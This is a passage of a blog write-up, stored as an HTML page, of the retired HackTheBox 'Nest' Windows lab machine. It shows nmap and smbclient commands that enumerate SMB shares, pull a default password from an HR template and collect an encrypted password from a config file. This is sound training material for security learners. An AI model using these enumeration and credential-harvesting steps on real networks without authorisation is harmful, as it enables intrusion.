@@ -1,0 +1,817 @@
+<!doctype html><html lang=en>
+<head>
+<meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="ie=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name=author content="DezeStijn">
+<meta name=description content="Write-up of the Nest machine by VbScrub on HackTheBox.eu.">
+<meta name=keywords content="Sequr,blog,writeup,CTF,challenge,machine,infosec,IT security,hacking,pentesting,cybersecurity,HackTheBox.eu,VbScrub,Machine,Nest">
+<meta name=robots content="noodp">
+<meta name=theme-color content="#252627">
+<link rel=canonical href=https://sequr.be/blog/2020/06/nest/>
+<title>
+Nest :: Sequr
+</title>
+<link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css>
+<link rel=stylesheet href=https://sequr.be/main.031a8efc33f94f55a4071bf4e91596478a5809fc8c148fab113801189cfd2152.css>
+<link rel=stylesheet type=text/css href=https://sequr.be/css/table.css>
+<link rel=stylesheet type=text/css href=https://sequr.be/css/menu.css>
+<link rel=apple-touch-icon sizes=180x180 href=https://sequr.be/apple-touch-icon.png>
+<link rel=icon type=image/png sizes=32x32 href=https://sequr.be/favicon-32x32.png>
+<link rel=icon type=image/png sizes=16x16 href=https://sequr.be/favicon-16x16.png>
+<link rel=manifest href=https://sequr.be/site.webmanifest>
+<link rel=mask-icon href=https://sequr.be/safari-pinned-tab.svg color=#e68101>
+<link rel="shortcut icon" href=https://sequr.be/favicon.ico>
+<meta name=msapplication-TileColor content="#e68101">
+<meta name=theme-color content="#e68101">
+<meta itemprop=name content="Nest">
+<meta itemprop=description content="Write-up of the Nest machine by VbScrub on HackTheBox.eu."><meta itemprop=datePublished content="2020-06-08T20:13:59+02:00">
+<meta itemprop=dateModified content="2020-06-08T20:13:59+02:00">
+<meta itemprop=wordCount content="3148"><meta itemprop=image content="https://sequr.be/img/htb-nest.png">
+<meta itemprop=keywords content="HackTheBox.eu,VbScrub,Machine,Nest,">
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://sequr.be/img/htb-nest.png">
+<meta name=twitter:title content="Nest">
+<meta name=twitter:description content="Write-up of the Nest machine by VbScrub on HackTheBox.eu.">
+<meta property="article:section" content="Hack The Box">
+<meta property="article:section" content="Writeup">
+<meta property="article:published_time" content="2020-06-08 20:13:59 +0200 +0200">
+</head>
+<body>
+<div class=container>
+<header class=header>
+<span class=header__inner>
+<a href=https://sequr.be style=text-decoration:none>
+<div class=logo>
+<span class=logo__mark>$</span>
+<span class=logo__text>nc sequr.be 1337</span>
+<span class=logo__cursor style=background-color:#e68101>
+</span>
+</div>
+</a>
+<span class=header__right>
+<nav class=menu>
+<ul class=menu__inner><li><a href=https://sequr.be/blog/>Blog</a></li><li><a href=https://sequr.be/about/>About</a></li><li><a href=https://sequr.be/shoppinglist/>Shopping</a></li><li><a href=https://sequr.be/privacy/>Privacy</a></li>
+</ul>
+</nav>
+<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+</span>
+<span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span>
+</span>
+</span>
+</header>
+<div class=content>
+<main class=post>
+<div class=post-info>
+<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+15 minutes
+</p>
+</div>
+<article>
+<h1 class=post-title>
+<a href=https://sequr.be/blog/2020/06/nest/>Nest</a>
+</h1>
+<hr>
+<aside id=toc>
+<div class=toc-title>Table of Contents</div>
+<nav id=TableOfContents>
+<ul>
+<li><a href=#machine-info>Machine info</a></li>
+<li><a href=#recon>Recon</a>
+<ul>
+<li><a href=#nmap>Nmap</a></li>
+<li><a href=#smb>SMB</a></li>
+</ul>
+</li>
+<li><a href=#foothold>Foothold</a>
+<ul>
+<li><a href=#testing-our-new-creds>Testing our new creds</a></li>
+<li><a href=#config-files>Config files</a></li>
+<li><a href=#secure>Secure</a></li>
+<li><a href=#programming-in-vb>Programming in VB</a></li>
+<li><a href=#agent-smith>Agent Smith</a></li>
+</ul>
+</li>
+<li><a href=#privesc>Privesc</a>
+<ul>
+<li><a href=#alternate-data-streams>Alternate Data Streams</a></li>
+<li><a href=#hqk-reporting>HQK Reporting</a></li>
+<li><a href=#ilspy>ILSpy</a></li>
+<li><a href=#getting-the-root-flag>Getting the root flag</a></li>
+</ul>
+</li>
+</ul>
+</nav>
+</aside>
+<hr>
+<div class=post-content>
+<p><strong>Note to fellow-HTBers:</strong> Only write-ups of retired HTB machines or challenges are allowed.</p>
+<h2 id=machine-info>Machine info <a href=#machine-info>¶</a></h2><p>Nest [by <a href=https://www.hackthebox.eu/home/users/profile/158833 target=_blank rel=noopener>VbScrub</a>]<br>
+IP: 10.10.10.178<br>
+OS: Windows<br>
+Difficulty: Easy<br>
+Release: 25 Jan 2020<br>
+Retired: 6 June 2020</p>
+<h2 id=recon>Recon <a href=#recon>¶</a></h2><h3 id=nmap>Nmap <a href=#nmap>¶</a></h3><p>As usual we kick off with a nmap scan of the box</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ nmap -v -sV -sC -oA scans/nmap_nest -Pn 10.10.10.178
+
+PORT    STATE SERVICE       VERSION
+445/tcp open  microsoft-ds?
+
+Host script results:
+<span class=p>|</span>_clock-skew: 3m33s
+<span class=p>|</span> smb2-security-mode: 
+<span class=p>|</span>   2.02: 
+<span class=p>|</span>_    Message signing enabled but not required
+<span class=p>|</span> smb2-time: 
+<span class=p>|</span>   date: 2020-05-10T18:35:02
+<span class=p>|</span>_  start_date: 2020-05-10T15:53:15
+
+4386/tcp open  unknown
+<span class=p>|</span> fingerprint-strings:
+<span class=p>|</span>   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe:
+<span class=p>|</span>     Reporting Service V1.2
+<span class=p>|</span>   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
+<span class=p>|</span>     Reporting Service V1.2
+<span class=p>|</span>     Unrecognised <span class=nb>command</span>
+<span class=p>|</span>   Help:
+<span class=p>|</span>     Reporting Service V1.2
+<span class=p>|</span>     This service allows users to run queries against databases using the legacy HQK format
+<span class=p>|</span>     AVAILABLE COMMANDS ---
+<span class=p>|</span>     LIST
+<span class=p>|</span>     SETDIR &lt;Directory_Name&gt;
+<span class=p>|</span>     RUNQUERY &lt;Query_ID&gt;
+<span class=p>|</span>     DEBUG &lt;Password&gt;
+<span class=p>|</span>_    HELP &lt;Command&gt;
+<span class=m>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port4386-TCP:V<span class=o>=</span>7.80%I<span class=o>=</span>7%D<span class=o>=</span>5/10%Time<span class=o>=</span>5EB84977%P<span class=o>=</span>x86_64-pc-linux-gnu%r<span class=o>(</span>NU
+SF:LL,21,<span class=s2>&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;</span><span class=o>)</span>%r<span class=o>(</span>GenericLin
+SF:es,3A,<span class=s2>&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;\r\nUnrecognise
+</span><span class=s2>SF:d\x20command\r\n&gt;&#34;</span><span class=o>)</span>%r<span class=o>(</span>GetRequest,3A,<span class=s2>&#34;\r\nHQK\x20Reporting\x20Service\x2
+</span><span class=s2>SF:0V1\.2\r\n\r\n&gt;\r\nUnrecognised\x20command\r\n&gt;&#34;</span><span class=o>)</span>%r<span class=o>(</span>HTTPOptions,3A,<span class=s2>&#34;\r\
+</span><span class=s2>SF:nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;\r\nUnrecognised\x20comma
+</span><span class=s2>SF:nd\r\n&gt;&#34;</span><span class=o>)</span>%r<span class=o>(</span>RTSPRequest,3A,<span class=s2>&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\
+</span><span class=s2>SF:n\r\n&gt;\r\nUnrecognised\x20command\r\n&gt;&#34;</span><span class=o>)</span>%r<span class=o>(</span>RPCCheck,21,<span class=s2>&#34;\r\nHQK\x20Repo
+</span><span class=s2>SF:rting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;</span><span class=o>)</span>%r<span class=o>(</span>DNSVersionBindReqTCP,21,<span class=s2>&#34;\r\nHQK
+</span><span class=s2>SF:\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;</span><span class=o>)</span>%r<span class=o>(</span>DNSStatusRequestTCP,21,<span class=s2>&#34;
+</span><span class=s2>SF:\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;</span><span class=o>)</span>%r<span class=o>(</span>Help,F2,<span class=s2>&#34;\r\nHQK\
+</span><span class=s2>SF:x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;\r\nThis\x20service\x20allows\
+</span><span class=s2>SF:x20users\x20to\x20run\x20queries\x20against\x20databases\x20using\x20th
+</span><span class=s2>SF:e\x20legacy\x20HQK\x20format\r\n\r\n---\x20AVAILABLE\x20COMMANDS\x20---
+</span><span class=s2>SF:\r\n\r\nLIST\r\nSETDIR\x20&lt;Directory_Name&gt;\r\nRUNQUERY\x20&lt;Query_ID&gt;\r\
+</span><span class=s2>SF:nDEBUG\x20&lt;Password&gt;\r\nHELP\x20&lt;Command&gt;\r\n&gt;&#34;</span><span class=o>)</span>%r<span class=o>(</span>SSLSessionReq,21,<span class=s2>&#34;\r
+</span><span class=s2>SF:\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;</span><span class=o>)</span>%r<span class=o>(</span>TerminalServerCooki
+SF:e,21,<span class=s2>&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;</span><span class=o>)</span>%r<span class=o>(</span>TLSSessionR
+SF:eq,21,<span class=s2>&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;</span><span class=o>)</span>%r<span class=o>(</span>Kerberos,2
+SF:1,<span class=s2>&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;</span><span class=o>)</span>%r<span class=o>(</span>SMBProgNeg,21,
+SF:<span class=s2>&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;</span><span class=o>)</span>%r<span class=o>(</span>X11Probe,21,<span class=s2>&#34;\r\
+</span><span class=s2>SF:nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;</span><span class=o>)</span>%r<span class=o>(</span>FourOhFourRequest,3A
+SF:,<span class=s2>&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;\r\nUnrecognised\x20
+</span><span class=s2>SF:command\r\n&gt;&#34;</span><span class=o>)</span>%r<span class=o>(</span>LPDString,21,<span class=s2>&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2
+</span><span class=s2>SF:\r\n\r\n&gt;&#34;</span><span class=o>)</span>%r<span class=o>(</span>LDAPSearchReq,21,<span class=s2>&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.
+</span><span class=s2>SF:2\r\n\r\n&gt;&#34;</span><span class=o>)</span>%r<span class=o>(</span>LDAPBindReq,21,<span class=s2>&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2
+</span><span class=s2>SF:\r\n\r\n&gt;&#34;</span><span class=o>)</span>%r<span class=o>(</span>SIPOptions,3A,<span class=s2>&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r
+</span><span class=s2>SF:\n\r\n&gt;\r\nUnrecognised\x20command\r\n&gt;&#34;</span><span class=o>)</span>%r<span class=o>(</span>LANDesk-RC,21,<span class=s2>&#34;\r\nHQK\x20R
+</span><span class=s2>SF:eporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;</span><span class=o>)</span>%r<span class=o>(</span>TerminalServer,21,<span class=s2>&#34;\r\nHQK\x2
+</span><span class=s2>SF:0Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;</span><span class=o>)</span><span class=p>;</span>
+</code></pre></div><h3 id=smb>SMB <a href=#smb>¶</a></h3><p>Since we see SMB is available (tcp/445), we perform a scan of the available shares.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ sudo smbclient -L 10.10.10.178
+Enter WORKGROUP<span class=se>\r</span>oot<span class=err>&#39;</span>s password: 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        Data            Disk      
+        IPC$            IPC       Remote IPC
+        Secure$         Disk      
+        Users           Disk      
+Reconnecting with SMB1 <span class=k>for</span> workgroup listing.
+do_connect: Connection to 10.10.10.178 failed <span class=o>(</span>Error NT_STATUS_IO_TIMEOUT<span class=o>)</span>
+Unable to connect with SMB1 -- no workgroup available
+</code></pre></div><p>There seem to be a few shares available.</p>
+<p>Digging around, we find a file containing maintenance alerts.<br>
+Perhaps we can find some info here on fixes that need to happen on this box?</p>
+<p>The file is located a <code>\Data\Shared\Maintenance\Maintance Alerts.txt</code>.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>smbclient -N <span class=se>\\\\</span>10.10.10.178<span class=se>\\</span>Data
+smb: <span class=se>\&gt;</span> <span class=nb>cd</span> Shared
+smb: <span class=se>\S</span>hared<span class=se>\&gt;</span> ls
+  .                                   D        <span class=m>0</span>  Wed Aug  <span class=m>7</span> 21:07:51 <span class=m>2019</span>
+  ..                                  D        <span class=m>0</span>  Wed Aug  <span class=m>7</span> 21:07:51 <span class=m>2019</span>
+  Maintenance                         D        <span class=m>0</span>  Wed Aug  <span class=m>7</span> 21:07:32 <span class=m>2019</span>
+  Templates                           D        <span class=m>0</span>  Wed Aug  <span class=m>7</span> 21:08:07 <span class=m>2019</span>
+                <span class=m>10485247</span> blocks of size 4096. <span class=m>6545663</span> blocks available
+smb: <span class=se>\S</span>hared<span class=se>\&gt;</span> <span class=nb>cd</span> Maintenance
+smb: <span class=se>\S</span>hared<span class=se>\M</span>aintenance<span class=se>\&gt;</span> ls
+  .                                   D        <span class=m>0</span>  Wed Aug  <span class=m>7</span> 21:07:32 <span class=m>2019</span>
+  ..                                  D        <span class=m>0</span>  Wed Aug  <span class=m>7</span> 21:07:32 <span class=m>2019</span>
+  Maintenance Alerts.txt              A       <span class=m>48</span>  Tue Aug  <span class=m>6</span> 01:01:44 <span class=m>2019</span>
+                <span class=m>10485247</span> blocks of size 4096. <span class=m>6545663</span> blocks available
+smb: <span class=se>\S</span>hared<span class=se>\M</span>aintenance<span class=se>\&gt;</span> get <span class=s2>&#34;Maintenance Alerts.txt&#34;</span>
+getting file <span class=se>\S</span>hared<span class=se>\M</span>aintenance<span class=se>\M</span>aintenance Alerts.txt of size <span class=m>48</span> as Maintenance Alerts.txt <span class=o>(</span>0,5 KiloBytes/sec<span class=o>)</span> <span class=o>(</span>average 0,5 KiloBytes/sec<span class=o>)</span>
+$ cat Maintenance<span class=se>\ </span>Alerts.txt 
+There is currently no scheduled maintenance work
+</code></pre></div><p>Sadly, nothing of interest here.</p>
+<p>Digging further, we find a template for a welcome email.<br>
+Perhaps this contains some info on getting access to the network/box?</p>
+<p>This one is found at <code>\Data\Shared\Templates\HR\Welcome Email.txt</code>.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ cat Welcome<span class=se>\ </span>Email.txt 
+We would like to extend a warm welcome to our newest member of staff, &lt;FIRSTNAME&gt; &lt;SURNAME&gt;
+
+You will find your home folder in the following location: 
+<span class=se>\\</span>HTB-NEST<span class=se>\U</span>sers<span class=se>\&lt;</span>USERNAME&gt;
+
+If you have any issues accessing specific services or workstations, please inform the 
+IT department and use the credentials below <span class=k>until</span> all systems have been <span class=nb>set</span> up <span class=k>for</span> you.
+
+Username: TempUser
+Password: welcome2019
+
+
+Thank you
+HR
+</code></pre></div><p>Here we find the path of the home directory for new employees/users.<br>
+But more importantly, we find a username and a password!<br>
+Also, we now have the hostname of the box.</p>
+<p>Having a look at the Users share we find a few usernames, including <code>TempUser</code>.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ smbclient -N <span class=se>\\\\</span>10.10.10.178<span class=se>\\</span>Users
+Try <span class=s2>&#34;help&#34;</span> to get a list of possible commands.
+smb: <span class=se>\&gt;</span> ls
+  .                                   D        <span class=m>0</span>  Sun Jan <span class=m>26</span> 00:04:21 <span class=m>2020</span>
+  ..                                  D        <span class=m>0</span>  Sun Jan <span class=m>26</span> 00:04:21 <span class=m>2020</span>
+  Administrator                       D        <span class=m>0</span>  Fri Aug  <span class=m>9</span> 17:08:23 <span class=m>2019</span>
+  C.Smith                             D        <span class=m>0</span>  Sun Jan <span class=m>26</span> 08:21:44 <span class=m>2020</span>
+  L.Frost                             D        <span class=m>0</span>  Thu Aug  <span class=m>8</span> 19:03:01 <span class=m>2019</span>
+  R.Thompson                          D        <span class=m>0</span>  Thu Aug  <span class=m>8</span> 19:02:50 <span class=m>2019</span>
+  TempUser                            D        <span class=m>0</span>  Thu Aug  <span class=m>8</span> 00:55:56 <span class=m>2019</span>
+                <span class=m>10485247</span> blocks of size 4096. <span class=m>6545663</span> blocks available
+</code></pre></div><h2 id=foothold>Foothold <a href=#foothold>¶</a></h2><h3 id=testing-our-new-creds>Testing our new creds <a href=#testing-our-new-creds>¶</a></h3><p>Using the newly acquired credentials, we have a look in the file shares again.</p>
+<p>The home directory of our <code>TempUser</code> contains a &ldquo;New Text Document&rdquo;.<br>
+Perhaps this contains some interesting info?</p>
+<p><code>\Users\TempUser\New Text Document.txt</code></p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ smbclient -U TempUser <span class=se>\\\\</span>10.10.10.178<span class=se>\\</span>Users
+smb: <span class=se>\T</span>empUser<span class=se>\&gt;</span> get <span class=s2>&#34;New Text Document.txt&#34;</span>
+getting file <span class=se>\T</span>empUser<span class=se>\N</span>ew Text Document.txt of size <span class=m>0</span> as New Text Document.txt <span class=o>(</span>0,0 KiloBytes/sec<span class=o>)</span> <span class=o>(</span>average 0,0 KiloBytes/sec<span class=o>)</span>
+
+$ cat New<span class=se>\ </span>Text<span class=se>\ </span>Document.txt
+</code></pre></div><p>Sadly, it appears to be empty.</p>
+<h3 id=config-files>Config files <a href=#config-files>¶</a></h3><p>Looking further, we find some configuration files for NotepadPlusPlus and something called &ldquo;RU Scanner&rdquo;.<br>
+Configuration files often hold credentials or references to interesting locations.</p>
+<p>The Notepad++ configuration file can be found at <code>\IT\Configs\NotepadPlusPlus\config.xml</code>.
+The config file for RU Scanner is located at <code>\IT\Configs\RU Scanner\RU_config.xml</code>.</p>
+<p>An easy way to recon folders on SMB is to do a recursive <code>ls</code>.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ smbclient -U TempUser <span class=se>\\\\</span>10.10.10.178<span class=se>\\</span>Data
+smb: <span class=se>\&gt;</span> recurse on
+smb: <span class=se>\&gt;</span> ls
+  .                                   D        <span class=m>0</span>  Thu Aug  <span class=m>8</span> 00:53:46 <span class=m>2019</span>
+  ..                                  D        <span class=m>0</span>  Thu Aug  <span class=m>8</span> 00:53:46 <span class=m>2019</span>
+  IT                                  D        <span class=m>0</span>  Thu Aug  <span class=m>8</span> 00:58:07 <span class=m>2019</span>
+  Production                          D        <span class=m>0</span>  Mon Aug  <span class=m>5</span> 23:53:38 <span class=m>2019</span>
+  Reports                             D        <span class=m>0</span>  Mon Aug  <span class=m>5</span> 23:53:44 <span class=m>2019</span>
+  Shared                              D        <span class=m>0</span>  Wed Aug  <span class=m>7</span> 21:07:51 <span class=m>2019</span>
+
+<span class=se>\I</span>T
+  .                                   D        <span class=m>0</span>  Thu Aug  <span class=m>8</span> 00:58:07 <span class=m>2019</span>
+  ..                                  D        <span class=m>0</span>  Thu Aug  <span class=m>8</span> 00:58:07 <span class=m>2019</span>
+  Archive                             D        <span class=m>0</span>  Tue Aug  <span class=m>6</span> 00:33:58 <span class=m>2019</span>
+  Configs                             D        <span class=m>0</span>  Thu Aug  <span class=m>8</span> 00:59:34 <span class=m>2019</span>
+  Installs                            D        <span class=m>0</span>  Thu Aug  <span class=m>8</span> 00:08:30 <span class=m>2019</span>
+  Reports                             D        <span class=m>0</span>  Sun Jan <span class=m>26</span> 01:09:13 <span class=m>2020</span>
+  Tools                               D        <span class=m>0</span>  Tue Aug  <span class=m>6</span> 00:33:43 <span class=m>2019</span>
+
+<span class=o>[</span>... cut <span class=k>for</span> brevity ...<span class=o>]</span>
+
+<span class=se>\I</span>T<span class=se>\C</span>onfigs
+  .                                   D        <span class=m>0</span>  Thu Aug  <span class=m>8</span> 00:59:34 <span class=m>2019</span>
+  ..                                  D        <span class=m>0</span>  Thu Aug  <span class=m>8</span> 00:59:34 <span class=m>2019</span>
+  Adobe                               D        <span class=m>0</span>  Wed Aug  <span class=m>7</span> 21:20:09 <span class=m>2019</span>
+  Atlas                               D        <span class=m>0</span>  Tue Aug  <span class=m>6</span> 13:16:18 <span class=m>2019</span>
+  DLink                               D        <span class=m>0</span>  Tue Aug  <span class=m>6</span> 15:25:27 <span class=m>2019</span>
+  Microsoft                           D        <span class=m>0</span>  Wed Aug  <span class=m>7</span> 21:23:26 <span class=m>2019</span>
+  NotepadPlusPlus                     D        <span class=m>0</span>  Wed Aug  <span class=m>7</span> 21:31:37 <span class=m>2019</span>
+  RU Scanner                          D        <span class=m>0</span>  Wed Aug  <span class=m>7</span> 22:01:13 <span class=m>2019</span>
+  Server Manager                      D        <span class=m>0</span>  Tue Aug  <span class=m>6</span> 15:25:19 <span class=m>2019</span>
+
+<span class=o>[</span>... cut <span class=k>for</span> brevity ...<span class=o>]</span>
+
+<span class=se>\I</span>T<span class=se>\C</span>onfigs<span class=se>\N</span>otepadPlusPlus
+  .                                   D        <span class=m>0</span>  Wed Aug  <span class=m>7</span> 21:31:37 <span class=m>2019</span>
+  ..                                  D        <span class=m>0</span>  Wed Aug  <span class=m>7</span> 21:31:37 <span class=m>2019</span>
+  config.xml                          A     <span class=m>6451</span>  Thu Aug  <span class=m>8</span> 01:01:25 <span class=m>2019</span>
+  shortcuts.xml                       A     <span class=m>2108</span>  Wed Aug  <span class=m>7</span> 21:30:27 <span class=m>2019</span>
+
+<span class=se>\I</span>T<span class=se>\C</span>onfigs<span class=se>\R</span>U Scanner
+  .                                   D        <span class=m>0</span>  Wed Aug  <span class=m>7</span> 22:01:13 <span class=m>2019</span>
+  ..                                  D        <span class=m>0</span>  Wed Aug  <span class=m>7</span> 22:01:13 <span class=m>2019</span>
+  RU_config.xml                       A      <span class=m>270</span>  Thu Aug  <span class=m>8</span> 21:49:37 <span class=m>2019</span>
+
+<span class=o>[</span>... cut <span class=k>for</span> brevity ...<span class=o>]</span>
+</code></pre></div><p>Looking at <code>RU_config.xml</code> we find the following info:</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=cp>&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+<span class=nt>&lt;ConfigFile</span> <span class=na>xmlns:xsi=</span><span class=s>&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span class=na>xmlns:xsd=</span><span class=s>&#34;http://www.w3.org/2001/XMLSchema&#34;</span><span class=nt>&gt;</span>
+  <span class=nt>&lt;Port&gt;</span>389<span class=nt>&lt;/Port&gt;</span>
+  <span class=nt>&lt;Username&gt;</span>c.smith<span class=nt>&lt;/Username&gt;</span>
+  <span class=nt>&lt;Password&gt;</span>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=<span class=nt>&lt;/Password&gt;</span>
+<span class=nt>&lt;/ConfigFile&gt;</span>
+</code></pre></div><p>We see a password here that seems to contain base64 encoded data (notice the <code>=</code> at the end).<br>
+However, trying to decode this gives us no useable output. There must be some extra encoding or encryption going on here.</p>
+<p>The <code>config.xml</code> of Notepad++ contains the following interesting info in the file history section.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=nt>&lt;History</span> <span class=na>nbMaxFile=</span><span class=s>&#34;15&#34;</span> <span class=na>inSubMenu=</span><span class=s>&#34;no&#34;</span> <span class=na>customLength=</span><span class=s>&#34;-1&#34;</span><span class=nt>&gt;</span>
+    <span class=nt>&lt;File</span> <span class=na>filename=</span><span class=s>&#34;C:\windows\System32\drivers\etc\hosts&#34;</span> <span class=nt>/&gt;</span>
+    <span class=nt>&lt;File</span> <span class=na>filename=</span><span class=s>&#34;\\HTB-NEST\Secure$\IT\Carl\Temp.txt&#34;</span> <span class=nt>/&gt;</span>
+    <span class=nt>&lt;File</span> <span class=na>filename=</span><span class=s>&#34;C:\Users\C.Smith\Desktop\todo.txt&#34;</span> <span class=nt>/&gt;</span>
+<span class=nt>&lt;/History&gt;</span>
+</code></pre></div><h3 id=secure>Secure <a href=#secure>¶</a></h3><p>Still using the credentials of the TempUser, we have a look at the Secure share.</p>
+<p>Using the same technique of recursive file listing, we find some interesting files.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ smbclient -U TempUser <span class=se>\\\\</span>10.10.10.178<span class=se>\\</span>Secure$
+Unable to initialize messaging context
+Enter WORKGROUP<span class=se>\T</span>empUser<span class=err>&#39;</span>s password:
+Try <span class=s2>&#34;help&#34;</span> to get a list of possible commands.
+smb: <span class=se>\&gt;</span> recurse on
+smb: <span class=se>\&gt;</span> ls
+  .                                   D        <span class=m>0</span>  Thu Aug  <span class=m>8</span> 01:08:12 <span class=m>2019</span>
+  ..                                  D        <span class=m>0</span>  Thu Aug  <span class=m>8</span> 01:08:12 <span class=m>2019</span>
+  Finance                             D        <span class=m>0</span>  Wed Aug  <span class=m>7</span> 21:40:13 <span class=m>2019</span>
+  HR                                  D        <span class=m>0</span>  Thu Aug  <span class=m>8</span> 01:08:11 <span class=m>2019</span>
+  IT                                  D        <span class=m>0</span>  Thu Aug  <span class=m>8</span> 12:59:25 <span class=m>2019</span>
+
+<span class=o>[</span>... cut <span class=k>for</span> brevity ...<span class=o>]</span>
+
+<span class=se>\I</span>T<span class=se>\C</span>arl<span class=se>\V</span>B Projects<span class=se>\W</span>IP
+  .                                   D        <span class=m>0</span>  Tue Aug  <span class=m>6</span> 16:47:41 <span class=m>2019</span>
+  ..                                  D        <span class=m>0</span>  Tue Aug  <span class=m>6</span> 16:47:41 <span class=m>2019</span>
+  RU                                  D        <span class=m>0</span>  Fri Aug  <span class=m>9</span> 17:36:45 <span class=m>2019</span>
+
+<span class=se>\I</span>T<span class=se>\C</span>arl<span class=se>\V</span>B Projects<span class=se>\W</span>IP<span class=se>\R</span>U
+  .                                   D        <span class=m>0</span>  Fri Aug  <span class=m>9</span> 17:36:45 <span class=m>2019</span>
+  ..                                  D        <span class=m>0</span>  Fri Aug  <span class=m>9</span> 17:36:45 <span class=m>2019</span>
+  RUScanner                           D        <span class=m>0</span>  Thu Aug  <span class=m>8</span> 00:05:54 <span class=m>2019</span>
+  RUScanner.sln                       A      <span class=m>871</span>  Tue Aug  <span class=m>6</span> 16:45:36 <span class=m>2019</span>
+
+<span class=se>\I</span>T<span class=se>\C</span>arl<span class=se>\V</span>B Projects<span class=se>\W</span>IP<span class=se>\R</span>U<span class=se>\R</span>UScanner
+  .                                   D        <span class=m>0</span>  Thu Aug  <span class=m>8</span> 00:05:54 <span class=m>2019</span>
+  ..                                  D        <span class=m>0</span>  Thu Aug  <span class=m>8</span> 00:05:54 <span class=m>2019</span>
+  bin                                 D        <span class=m>0</span>  Wed Aug  <span class=m>7</span> 22:00:11 <span class=m>2019</span>
+  ConfigFile.vb                       A      <span class=m>772</span>  Thu Aug  <span class=m>8</span> 00:05:09 <span class=m>2019</span>
+  Module1.vb                          A      <span class=m>279</span>  Thu Aug  <span class=m>8</span> 00:05:44 <span class=m>2019</span>
+  My Project                          D        <span class=m>0</span>  Wed Aug  <span class=m>7</span> 22:00:11 <span class=m>2019</span>
+  obj                                 D        <span class=m>0</span>  Wed Aug  <span class=m>7</span> 22:00:11 <span class=m>2019</span>
+  RU Scanner.vbproj                   A     <span class=m>4828</span>  Fri Aug  <span class=m>9</span> 17:37:51 <span class=m>2019</span>
+  RU Scanner.vbproj.user              A      <span class=m>143</span>  Tue Aug  <span class=m>6</span> 14:55:27 <span class=m>2019</span>
+  SsoIntegration.vb                   A      <span class=m>133</span>  Thu Aug  <span class=m>8</span> 00:05:58 <span class=m>2019</span>
+  Utils.vb                            A     <span class=m>4888</span>  Wed Aug  <span class=m>7</span> 21:49:35 <span class=m>2019</span>
+
